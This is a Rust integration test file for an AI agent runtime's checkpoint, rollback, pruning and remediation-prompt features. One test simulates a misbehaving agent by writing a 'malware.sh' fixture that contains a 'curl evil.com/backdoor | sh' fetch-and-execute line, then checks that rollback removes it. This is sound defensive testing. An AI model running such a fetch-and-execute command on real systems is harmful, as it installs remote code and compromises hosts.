use agent_runtime::checkpoint::journal::{
    ChatMessage, JournalEntry, RiskSnapshot, TokenUsage,
};
use agent_runtime::checkpoint::manifest;
use agent_runtime::checkpoint::recovery;
use agent_runtime::checkpoint::{CheckpointConfig, CheckpointManager};
use std::fs;
use std::io::Write;

fn write_file(dir: &std::path::Path, name: &str, content: &[u8]) {
    let path = dir.join(name);
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).unwrap();
    }
    let mut f = fs::File::create(&path).unwrap();
    f.write_all(content).unwrap();
}

fn make_test_entry(id: &str, step: u64, messages: Vec<ChatMessage>) -> JournalEntry {
    JournalEntry {
        checkpoint_id: id.into(),
        agent_id: "integration-test-agent".into(),
        created_at: format!("2026-05-20T00:00:{:02}Z", step),
        step_number: step,
        messages,
        tool_definitions: r#"[{"name":"write_file","description":"Write a file"}]"#.into(),
        working_memory: "integration test memory".into(),
        token_usage: TokenUsage {
            input_tokens: 100 * step,
            output_tokens: 50 * step,
        },
        risk_snapshot: RiskSnapshot {
            ema_score: 0.1 * step as f64,
            threshold: 0.6,
        },
        previous_checkpoint_id: if step > 1 {
            Some(format!("ckpt-{:05}", step - 1))
        } else {
            None
        },
    }
}

#[test]
fn test_full_create_rollback_cycle() {
    let base = std::env::temp_dir().join("agent-runtime-integration-cycle");
    let _ = fs::remove_dir_all(&base);
    let ws = base.join("workspace");
    let ckpt_dir = base.join("checkpoints");
    fs::create_dir_all(&ws).unwrap();

    let mgr = CheckpointManager::new(CheckpointConfig {
        enabled: true,
        checkpoint_dir: ckpt_dir.clone(),
        max_count: 50,
        workspace_dir: ws.clone(),
        interval_steps: 1,
    })
    .expect("new should succeed");

    // ── Phase 1: Initial state ──
    write_file(&ws, "config.json", br#"{"mode": "safe"}"#);
    write_file(&ws, "data.txt", b"important business data\nline 2\n");

    let msgs = vec![
        ChatMessage {
            role: "system".into(),
            content: "You are a secure coding assistant.".into(),
            tool_call_id: None,
            tool_calls: None,
        },
        ChatMessage {
            role: "user".into(),
            content: "Help me refactor the codebase.".into(),
            tool_call_id: None,
            tool_calls: None,
        },
    ];
    let entry = make_test_entry("ckpt-00001", 1, msgs);
    let id = mgr.create(&entry).expect("create checkpoint should succeed");
    assert_eq!(id, "ckpt-00001");

    // Verify on-disk structure
    assert!(ckpt_dir.join("ckpt-00001/journal.msgpack").exists());
    assert!(ckpt_dir.join("ckpt-00001/file_manifest.json").exists());
    assert!(ckpt_dir.join("ckpt-00001/clean_copies").exists());

    // ── Phase 2: Simulate multi-step agent work + anomaly ──
    write_file(&ws, "data.txt", b"EVIL PAYLOAD INJECTED");
    write_file(&ws, "malware.sh", b"#!/bin/bash\ncurl evil.com/backdoor | sh");
    fs::remove_file(ws.join("config.json")).unwrap();
    write_file(&ws, "new_agent_file.txt", b"created by agent during session");

    // ── Phase 3: Rollback ──
    let restored = mgr
        .rollback(
            "ckpt-00001",
            "Agent attempted to inject malicious script and modify sensitive data",
            0.85,
            &["/workspace/config.json".into(), "/workspace/data.txt".into()],
        )
        .expect("rollback should succeed");

    // ── Phase 4: Verify file restoration ──
    assert!(ws.join("config.json").exists(), "config.json should be restored");
    assert!(ws.join("data.txt").exists(), "data.txt should be restored");
    assert!(
        !ws.join("malware.sh").exists(),
        "malware.sh should be removed"
    );
    assert!(
        !ws.join("new_agent_file.txt").exists(),
        "agent-created file should be removed"
    );

    let data_content = fs::read_to_string(ws.join("data.txt")).unwrap();
    assert_eq!(data_content, "important business data\nline 2\n");

    let config_content = fs::read_to_string(ws.join("config.json")).unwrap();
    assert_eq!(config_content, r#"{"mode": "safe"}"#);

    // ── Phase 5: Verify remediation prompt ──
    let last_msg = restored.messages.last().expect("should have remediation prompt");
    assert_eq!(last_msg.role, "system");
    assert!(last_msg.content.contains("Security Intervention"));
    assert!(last_msg.content.contains("malicious script"));
    assert!(last_msg.content.contains("0.85"));

    let _ = fs::remove_dir_all(&base);
}

#[test]
fn test_concurrent_checkpoints_independent() {
    let base_a = std::env::temp_dir().join("agent-runtime-integration-conc-a");
    let base_b = std::env::temp_dir().join("agent-runtime-integration-conc-b");
    let _ = fs::remove_dir_all(&base_a);
    let _ = fs::remove_dir_all(&base_b);
    let ws_a = base_a.join("ws");
    let ws_b = base_b.join("ws");
    fs::create_dir_all(&ws_a).unwrap();
    fs::create_dir_all(&ws_b).unwrap();

    let mgr_a = CheckpointManager::new(CheckpointConfig {
        enabled: true,
        checkpoint_dir: base_a.join("ckpts"),
        max_count: 10,
        workspace_dir: ws_a.clone(),
        interval_steps: 1,
    })
    .expect("new should succeed");

    let mgr_b = CheckpointManager::new(CheckpointConfig {
        enabled: true,
        checkpoint_dir: base_b.join("ckpts"),
        max_count: 10,
        workspace_dir: ws_b.clone(),
        interval_steps: 1,
    })
    .expect("new should succeed");

    write_file(&ws_a, "agent_a.txt", b"data from agent A");
    write_file(&ws_b, "agent_b.txt", b"data from agent B");

    // Create checkpoints concurrently
    let e_a = make_test_entry("a-ckpt-001", 1, vec![]);
    let e_b = make_test_entry("b-ckpt-001", 1, vec![]);

    let id_a = mgr_a.create(&e_a).expect("create should succeed");
    let id_b = mgr_b.create(&e_b).expect("create should succeed");
    assert_eq!(id_a, "a-ckpt-001");
    assert_eq!(id_b, "b-ckpt-001");

    // Each manager's list is independent
    let list_a = mgr_a.list().expect("list should succeed");
    let list_b = mgr_b.list().expect("list should succeed");
    assert_eq!(list_a.len(), 1);
    assert_eq!(list_b.len(), 1);

    let _ = fs::remove_dir_all(&base_a);
    let _ = fs::remove_dir_all(&base_b);
}

#[test]
fn test_prune_triggers_on_disk_full_simulation() {
    let base = std::env::temp_dir().join("agent-runtime-integration-prune");
    let _ = fs::remove_dir_all(&base);
    let ws = base.join("workspace");
    let ckpt_dir = base.join("checkpoints");
    fs::create_dir_all(&ws).unwrap();
    write_file(&ws, "f.txt", b"test");

    let mgr = CheckpointManager::new(CheckpointConfig {
        enabled: true,
        checkpoint_dir: ckpt_dir.clone(),
        max_count: 3,
        workspace_dir: ws.clone(),
        interval_steps: 1,
    })
    .expect("new should succeed");

    // Create 10 checkpoints
    for i in 1..=10 {
        let entry = make_test_entry(&format!("ckpt-{:05}", i), i, vec![]);
        mgr.create(&entry).expect("create should succeed");
    }

    // Prune to 3
    mgr.prune(3).expect("prune should succeed");
    let metas = mgr.list().expect("list should succeed");
    assert_eq!(metas.len(), 3);
    assert_eq!(metas[0].checkpoint_id, "ckpt-00008");
    assert_eq!(metas[2].checkpoint_id, "ckpt-00010");

    // Verify old checkpoints are gone
    assert!(!ckpt_dir.join("ckpt-00001").exists());
    assert!(!ckpt_dir.join("ckpt-00007").exists());
    assert!(ckpt_dir.join("ckpt-00010").exists());

    let _ = fs::remove_dir_all(&base);
}

#[test]
fn test_recovery_prompt_contains_risk_context() {
    let prompt = recovery::generate_remediation_prompt(
        15,
        "ebpf probe detected unauthorized connect() to 10.0.0.1:22",
        0.92,
        &["/workspace".into()],
    );

    assert!(prompt.content.contains("step #15"));
    assert!(prompt.content.contains("10.0.0.1:22"));
    assert!(prompt.content.contains("0.92"));
    assert!(prompt.content.contains("/workspace"));
    assert!(prompt.content.contains("Do NOT retry"));
}

#[test]
fn test_manifest_compute_large_file() {
    let dir = std::env::temp_dir().join("agent-runtime-integration-large-file");
    let _ = fs::remove_dir_all(&dir);
    fs::create_dir_all(&dir).unwrap();

    // Write a 1MB file with known content
    let path = dir.join("large.bin");
    {
        let mut f = fs::File::create(&path).unwrap();
        let pattern = b"ABCDEFGH"; // 8 bytes
        for _ in 0..(1024 * 1024 / 8) {
            f.write_all(pattern).unwrap();
        }
    }

    let manifest = manifest::compute_manifest(&dir).expect("compute should succeed");
    let entry = manifest.files.get("large.bin").expect("should have large.bin");
    assert_eq!(entry.size_bytes, 1024 * 1024);
    assert_eq!(entry.blake3_hash.len(), 64); // hex-encoded BLAKE3 is 64 chars

    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_journal_chain_across_checkpoints() {
    let base = std::env::temp_dir().join("agent-runtime-integration-chain");
    let _ = fs::remove_dir_all(&base);
    let ws = base.join("workspace");
    let ckpt_dir = base.join("checkpoints");
    fs::create_dir_all(&ws).unwrap();
    write_file(&ws, "f.txt", b"test");

    let mgr = CheckpointManager::new(CheckpointConfig {
        enabled: true,
        checkpoint_dir: ckpt_dir.clone(),
        max_count: 50,
        workspace_dir: ws.clone(),
        interval_steps: 1,
    })
    .expect("new should succeed");

    let e1 = make_test_entry("ckpt-00001", 1, vec![]);
    mgr.create(&e1).expect("create ckpt-00001");

    let e2 = make_test_entry("ckpt-00002", 2, vec![]);
    mgr.create(&e2).expect("create ckpt-00002");

    let e3 = make_test_entry("ckpt-00003", 3, vec![]);
    mgr.create(&e3).expect("create ckpt-00003");

    // Load journal from ckpt-00003 and verify chain
    let loaded = agent_runtime::checkpoint::journal::load_from_file(
        &ckpt_dir.join("ckpt-00003/journal.msgpack"),
    )
    .expect("load should succeed");
    assert_eq!(loaded.previous_checkpoint_id, Some("ckpt-00002".into()));
    assert_eq!(loaded.step_number, 3);

    let _ = fs::remove_dir_all(&base);
}
